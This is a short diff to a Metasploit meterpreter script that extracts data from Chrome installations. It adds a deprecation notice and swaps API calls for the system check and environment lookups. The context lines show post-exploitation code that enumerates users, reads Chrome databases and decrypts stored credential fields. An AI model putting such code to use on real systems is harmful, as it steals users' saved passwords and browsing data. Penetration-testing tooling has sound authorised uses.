@@ -1,3 +1,10 @@
+##
+# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
+# If you'd like to improve this script, please try to port it as a post
+# module instead. Thank you.
+##
+
+
 #
 # Script to extract data from a chrome installation.
 #
@@ -138,7 +145,7 @@ def process_files(username)
       db.close
       rows.map! do |row|
         res = Hash[*columns.zip(row).flatten]
-        if item[:encrypted_fields] && client.sys.config.getuid != "NT AUTHORITY\\SYSTEM"
+        if item[:encrypted_fields] && !client.sys.config.is_system?
           if @host_info['Architecture'] !~ /x64/
             item[:encrypted_fields].each do |field|
               print_good("decrypting field '#{field}'...")
@@ -195,7 +202,7 @@ host = session.session_host
 @log_dir = File.join(Msf::Config.log_directory, "scripts", "enum_chrome", Rex::FileUtils.clean_path(@host_info['Computer']), Time.now.strftime("%Y%m%d.%H%M"))
 ::FileUtils.mkdir_p(@log_dir)
 
-sysdrive = client.fs.file.expand_path("%SYSTEMDRIVE%")
+sysdrive = client.sys.config.getenv('SYSTEMDRIVE')
 os = @host_info['OS']
 if os =~ /(Windows 7|2008|Vista)/
   @profiles_path = sysdrive + "\\Users\\"
@@ -218,7 +225,7 @@ if is_system?
   print_status "users found: #{usernames.join(", ")}"
 else
   print_status "running as user '#{uid}'..."
-  usernames << client.fs.file.expand_path("%USERNAME%")
+  usernames << client.sys.config.getenv('USERNAME')
   prepare_railgun
 end
 
